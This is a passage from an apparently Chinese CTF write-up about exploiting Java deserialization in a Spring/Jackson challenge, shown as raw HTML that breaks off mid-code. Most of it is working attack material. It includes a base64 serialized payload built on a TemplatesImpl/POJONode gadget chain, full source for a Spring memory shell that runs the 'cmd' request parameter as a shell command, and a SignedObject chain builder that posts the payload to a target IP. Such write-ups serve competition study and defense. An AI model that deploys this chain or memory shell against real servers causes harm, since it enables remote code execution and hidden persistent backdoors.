192.168.120.1:8000Transfer-Encoding:chunkedContent-Type: text/plainContent-Length: 215285crO0ABXNyAC5qYXZheC5tYW5hZ2VtZW50LkJhZEF0dHJpYnV0ZVZhbHVlRXhwRXhjZXB0aW9u1Ofaq2MtRkACAAFMAAN2YWx0ABJMamF2YS9sYW5nL09iamVjdDt4cgATamF2YS5sYW5nLkV4Y2VwdGlvbtD9Hz4aOxzEAgAAeHIAE2phdmEubGFuZy5UaHJvd2FibGXVxjUnOXe4ywMABEwABWNhdXNldAAVTGphdmEvbGFuZy9UaHJvd2FibGU7TAANZGV0YWlsTWVzc2FnZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sACnN0YWNrVHJhY2V0AB5bTGphdmEvbGFuZy9TdGFja1RyYWNlRWxlbWVudDtMABRzdXBwcmVzc2VkRXhjZXB0aW9uc3QAEExqYXZhL3V0aWwvTGlzdDt4cHEAfgAIcHVyAB5bTGphdmEubGFuZy5TdGFja1RyYWNlRWxlbWVudDsCRio8PP0iOQIAAHhwAAAAAXNyABtqYXZhLmxhbmcuU3RhY2tUcmFjZUVsZW1lbnRhCcWaJjbdhQIABEkACmxpbmVOdW1iZXJMAA5kZWNsYXJpbmdDbGFzc3EAfgAFTAAIZmlsZU5hbWVxAH4ABUwACm1ldGhvZE5hbWVxAH4ABXhwAAAALHQAIm9yZy5jb20uamFja3Nvbi5UZW1wbGF0ZXNJbXBsQ2hhaW50ABdUZW1wbGF0ZXNJbXBsQ2hhaW4uamF2YXQABG1haW5zcgAmamF2YS51dGlsLkNvbGxlY3Rpb25zJFVubW9kaWZpYWJsZUxpc3T8DyUxteyOEAIAAUwABGxpc3RxAH4AB3hyACxqYXZhLnV0aWwuQ29sbGVjdGlvbnMkVW5tb2RpZmlhYmxlQ29sbGVjdGlvbhlCAIDLXvceAgABTAABY3QAFkxqYXZhL3V0aWwvQ29sbGVjdGlvbjt4cHNyABNqYXZhLnV0aWwuQXJyYXlMaXN0eIHSHZnHYZ0DAAFJAARzaXpleHAAAAAAdwQAAAAAeHEAfgAVeHNyACxjb20uZmFzdGVyeG1sLmphY2tzb24uZGF0YWJpbmQubm9kZS5QT0pPTm9kZQAAAAAAAAACAgABTAAGX3ZhbHVlcQB+AAF4cgAtY29tLmZhc3RlcnhtbC5qYWNrc29uLmRhdGFiaW5kLm5vZGUuVmFsdWVOb2RlAAAAAAAAAAECAAB4cgAwY29tLmZhc3RlcnhtbC5qYWNrc29uLmRhdGFiaW5kLm5vZGUuQmFzZUpzb25Ob2RlAAAAAAAAAAECAAB4cHNyADpjb20uc3VuLm9yZy5hcGFjaGUueGFsYW4uaW50ZXJuYWwueHNsdGMudHJheC5UZW1wbGF0ZXNJbXBsCVdPwW6sqzMDAAZJAA1faW5kZW50TnVtYmVySQAOX3RyYW5zbGV0SW5kZXhbAApfYnl0ZWNvZGVzdAADW1tCWwAGX2NsYXNzdAASW0xqYXZhL2xhbmcvQ2xhc3M7TAAFX25hbWVxAH4ABUwAEV9vdXRwdXRQcm9wZXJ0aWVzdAAWTGphdmEvdXRpbC9Qcm9wZXJ0aWVzO3hwAAAAAP////91cgADW1tCS/0ZFWdn2zcCAAB4cAAAAAF1cgACW0Ks8xf4BghU4AIAAHhwAAABVsr+ur4AAAA0ABgBAAFhBwABAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAcAAwEABjxpbml0PgEAAygpVgEABENvZGUMAAUABgoABAAIAQARamF2YS9sYW5nL1J1bnRpbWUHAAoBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7DAAMAA0KAAsADgEABGNhbGMIABABAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAASABMKAAsAFAEAClNvdXJjZUZpbGUBAAZhLmphdmEAIQACAAQAAAAAAAEAAQAFAAYAAQAHAAAAGgACAAEAAAAOKrcACbgADxIRtgAVV7EAAAAAAAEAFgAAAAIAF3B0AAhib29naXBvcHB3AQB40</code></pre><p>成功执行命令：</p><p>​<img src="/Blogimages/DASCTF_X_CBCTF_2023/image-20231113093905-qs4ijsr.png" alt="image">​</p><p>‍</p><h3 id="第三个点：如何打内存马"><a href="#第三个点：如何打内存马" class="headerlink" title="第三个点：如何打内存马"></a>第三个点：如何打内存马</h3><p>其实这里和触发计算器是一个道理，只需要把触发计算器的恶意类换成我们需要打的内存马即可</p><p>不过打何种内存马确实是有学问的，是spring内存马还是servlet内存马是需要根据环境判断的</p><p>这里看他的依赖就是spring，直接上通用的springboot内存马：</p><pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>memoryshell<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>DOM<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>TransletException<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>runtime<span class="token punctuation">.</span>AbstractTranslet<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>dtm<span class="token punctuation">.</span>DTMAxisIterator<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>serializer<span class="token punctuation">.</span>SerializationHandler<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>context<span class="token punctuation">.</span>WebApplicationContext<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>context<span class="token punctuation">.</span>request<span class="token punctuation">.</span>RequestContextHolder<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>mvc<span class="token punctuation">.</span>condition<span class="token punctuation">.</span>RequestMethodsRequestCondition<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>mvc<span class="token punctuation">.</span>method<span class="token punctuation">.</span>RequestMappingInfo<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>mvc<span class="token punctuation">.</span>method<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span>RequestMappingHandlerMapping<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span>HttpServletRequest<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span>HttpServletResponse<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>IOException<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>InputStream<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Field<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Method<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Scanner<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SpringMemShell</span> <span class="token keyword">extends</span> <span class="token class-name">AbstractTranslet</span> <span class="token punctuation">{</span>    <span class="token keyword">static</span> <span class="token punctuation">{</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            WebApplicationContext context <span class="token operator">=</span> <span class="token punctuation">(</span>WebApplicationContext<span class="token punctuation">)</span> RequestContextHolder<span class="token punctuation">.</span><span class="token function">currentRequestAttributes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getAttribute</span><span class="token punctuation">(</span><span class="token string">"org.springframework.web.servlet.DispatcherServlet.CONTEXT"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            RequestMappingHandlerMapping mappingHandlerMapping <span class="token operator">=</span> context<span class="token punctuation">.</span><span class="token function">getBean</span><span class="token punctuation">(</span>RequestMappingHandlerMapping<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Field configField <span class="token operator">=</span> mappingHandlerMapping<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"config"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            configField<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            RequestMappingInfo<span class="token punctuation">.</span>BuilderConfiguration config <span class="token operator">=</span>                    <span class="token punctuation">(</span>RequestMappingInfo<span class="token punctuation">.</span>BuilderConfiguration<span class="token punctuation">)</span> configField<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>mappingHandlerMapping<span class="token punctuation">)</span><span class="token punctuation">;</span>            Method method2 <span class="token operator">=</span> SpringMemShell<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"shell"</span><span class="token punctuation">,</span> HttpServletRequest<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> HttpServletResponse<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            RequestMethodsRequestCondition ms <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RequestMethodsRequestCondition</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            RequestMappingInfo info <span class="token operator">=</span> RequestMappingInfo<span class="token punctuation">.</span><span class="token function">paths</span><span class="token punctuation">(</span><span class="token string">"/shell"</span><span class="token punctuation">)</span>                    <span class="token punctuation">.</span><span class="token function">options</span><span class="token punctuation">(</span>config<span class="token punctuation">)</span>                    <span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            SpringMemShell springControllerMemShell <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SpringMemShell</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            mappingHandlerMapping<span class="token punctuation">.</span><span class="token function">registerMapping</span><span class="token punctuation">(</span>info<span class="token punctuation">,</span> springControllerMemShell<span class="token punctuation">,</span> method2<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> hi<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment" spellcheck="true">//            hi.printStackTrace();</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">shell</span><span class="token punctuation">(</span>HttpServletRequest request<span class="token punctuation">,</span> HttpServletResponse response<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"cmd"</span><span class="token punctuation">)</span> <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">boolean</span> isLinux <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            String osTyp <span class="token operator">=</span> System<span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"os.name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>osTyp <span class="token operator">!=</span> null <span class="token operator">&amp;&amp;</span> osTyp<span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"win"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                isLinux <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            String<span class="token punctuation">[</span><span class="token punctuation">]</span> cmds <span class="token operator">=</span> isLinux <span class="token operator">?</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"sh"</span><span class="token punctuation">,</span> <span class="token string">"-c"</span><span class="token punctuation">,</span> request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"cmd"</span><span class="token punctuation">)</span><span class="token punctuation">}</span> <span class="token operator">:</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"cmd.exe"</span><span class="token punctuation">,</span> <span class="token string">"/c"</span><span class="token punctuation">,</span> request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"cmd"</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">;</span>            InputStream in <span class="token operator">=</span> Runtime<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>cmds<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Scanner s <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Scanner</span><span class="token punctuation">(</span>in<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">useDelimiter</span><span class="token punctuation">(</span><span class="token string">"\\A"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            String output <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">hasNext</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">?</span> s<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token string">""</span><span class="token punctuation">;</span>            response<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span><span class="token punctuation">;</span>            response<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">transform</span><span class="token punctuation">(</span>DOM document<span class="token punctuation">,</span> SerializationHandler<span class="token punctuation">[</span><span class="token punctuation">]</span> handlers<span class="token punctuation">)</span> <span class="token keyword">throws</span> TransletException <span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">transform</span><span class="token punctuation">(</span>DOM document<span class="token punctuation">,</span> DTMAxisIterator iterator<span class="token punctuation">,</span> SerializationHandler handler<span class="token punctuation">)</span> <span class="token keyword">throws</span> TransletException <span class="token punctuation">{</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>编译之后拿到绝对路径的class文件替换一下之前的calc的恶意类即可：</p><pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> org<span class="token punctuation">.</span>com<span class="token punctuation">.</span>jackson<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>fasterxml<span class="token punctuation">.</span>jackson<span class="token punctuation">.</span>databind<span class="token punctuation">.</span>node<span class="token punctuation">.</span>POJONode<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>deploy<span class="token punctuation">.</span>cache<span class="token punctuation">.</span>BaseLocalApplicationProperties<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>runtime<span class="token punctuation">.</span>AbstractTranslet<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span>TemplatesImpl<span class="token punctuation">;</span><span class="token keyword">import</span> javassist<span class="token punctuation">.</span>ClassPool<span class="token punctuation">;</span><span class="token keyword">import</span> javassist<span class="token punctuation">.</span>CtClass<span class="token punctuation">;</span><span class="token keyword">import</span> javassist<span class="token punctuation">.</span>CtConstructor<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>http<span class="token punctuation">.</span>HttpEntity<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>http<span class="token punctuation">.</span>HttpHeaders<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>http<span class="token punctuation">.</span>ResponseEntity<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>client<span class="token punctuation">.</span>RestTemplate<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>management<span class="token punctuation">.</span>BadAttributeValueExpException<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>*<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Field<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>net<span class="token punctuation">.</span>URI<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span>Files<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span>Paths<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>security<span class="token punctuation">.</span>*<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Base64<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SignedObjectChain</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span><span class="token comment" spellcheck="true">//        ClassPool pool = ClassPool.getDefault();</span><span class="token comment" spellcheck="true">//        CtClass ctClass = pool.makeClass("a");</span><span class="token comment" spellcheck="true">//        CtClass superClass = pool.get(AbstractTranslet.class.getName());</span><span class="token comment" spellcheck="true">//        ctClass.setSuperclass(superClass);</span><span class="token comment" spellcheck="true">//        CtConstructor constructor = new CtConstructor(new CtClass[]{},ctClass);</span><span class="token comment" spellcheck="true">//        constructor.setBody("Runtime.getRuntime().exec(\"calc\");");</span><span class="token comment" spellcheck="true">//        ctClass.addConstructor(constructor);</span><span class="token comment" spellcheck="true">//        byte[] bytes = ctClass.toBytecode();</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes <span class="token operator">=</span> Files<span class="token punctuation">.</span><span class="token function">readAllBytes</span><span class="token punctuation">(</span>Paths<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"C:\\Users\\HP\\IdeaProjects\\JavaChains\\target\\classes\\com\\memoryshell\\SpringMemShell.class"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        TemplatesImpl templatesImpl <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TemplatesImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>templatesImpl<span class="token punctuation">,</span> <span class="token string">"_bytecodes"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>bytes<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>templatesImpl<span class="token punctuation">,</span> <span class="token string">"_name"</span><span class="token punctuation">,</span> <span class="token string">"boogipop"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>templatesImpl<span class="token punctuation">,</span> <span class="token string">"_tfactory"</span><span class="token punctuation">,</span> null<span class="token punctuation">)</span><span class="token punctuation">;</span>        POJONode jsonNodes2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">POJONode</span><span class="token punctuation">(</span>templatesImpl<span class="token punctuation">)</span><span class="token punctuation">;</span>        BadAttributeValueExpException exp2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BadAttributeValueExpException</span><span class="token punctuation">(</span>null<span class="token punctuation">)</span><span class="token punctuation">;</span>        Field val2 <span class="token operator">=</span> Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"javax.management.BadAttributeValueExpException"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"val"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        val2<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        val2<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>exp2<span class="token punctuation">,</span>jsonNodes2<span class="token punctuation">)</span><span class="token punctuation">;</span>        KeyPairGenerator keyPairGenerator<span class="token punctuation">;</span>        keyPairGenerator <span class="token operator">=</span> KeyPairGenerator<span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token string">"DSA"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        keyPairGenerator<span class="token punctuation">.</span><span class="token function">initialize</span><span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        KeyPair keyPair <span class="token operator">=</span> keyPairGenerator<span class="token punctuation">.</span><span class="token function">genKeyPair</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        PrivateKey privateKey <span class="token operator">=</span> keyPair<span class="token punctuation">.</span><span class="token function">getPrivate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Signature signingEngine <span class="token operator">=</span> Signature<span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token string">"DSA"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        SignedObject signedObject <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SignedObject</span><span class="token punctuation">(</span>exp2<span class="token punctuation">,</span>privateKey<span class="token punctuation">,</span>signingEngine<span class="token punctuation">)</span><span class="token punctuation">;</span>        POJONode jsonNodes <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">POJONode</span><span class="token punctuation">(</span>signedObject<span class="token punctuation">)</span><span class="token punctuation">;</span>        BadAttributeValueExpException exp <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BadAttributeValueExpException</span><span class="token punctuation">(</span>null<span class="token punctuation">)</span><span class="token punctuation">;</span>        Field val <span class="token operator">=</span> Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"javax.management.BadAttributeValueExpException"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"val"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        val<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        val<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>exp<span class="token punctuation">,</span>jsonNodes<span class="token punctuation">)</span><span class="token punctuation">;</span>        ByteArrayOutputStream barr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ObjectOutputStream objectOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>barr<span class="token punctuation">)</span><span class="token punctuation">;</span>        objectOutputStream<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>exp<span class="token punctuation">)</span><span class="token punctuation">;</span>        FileOutputStream fout<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"1.ser"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        fout<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>barr<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        fout<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        FileInputStream fileInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"1.ser"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%x\n"</span><span class="token punctuation">,</span> <span class="token function">serial</span><span class="token punctuation">(</span>exp<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token function">serial</span><span class="token punctuation">(</span>exp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//        deserial(serial(exp));</span>        <span class="token comment" spellcheck="true">//doPOST(exp.toString().getBytes());</span>        <span class="token comment" spellcheck="true">//byte[] byt=new byte[fileInputStream.available()];</span>        <span class="token comment" spellcheck="true">//fileInputStream.read(byt);</span>        <span class="token comment" spellcheck="true">//doPOST(byt);</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">doPOST</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> obj<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception<span class="token punctuation">{</span>        HttpHeaders requestHeaders <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HttpHeaders</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        requestHeaders<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">"Content-Type"</span><span class="token punctuation">,</span> <span class="token string">"text/plain"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        URI url <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URI</span><span class="token punctuation">(</span><span class="token string">"http://112.124.14.13:8080/bypassit"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//URI url = new URI("http://localhost:8080/bypassit");</span>        HttpEntity<span class="token operator">&lt;</span><span class="token keyword">byte</span><span 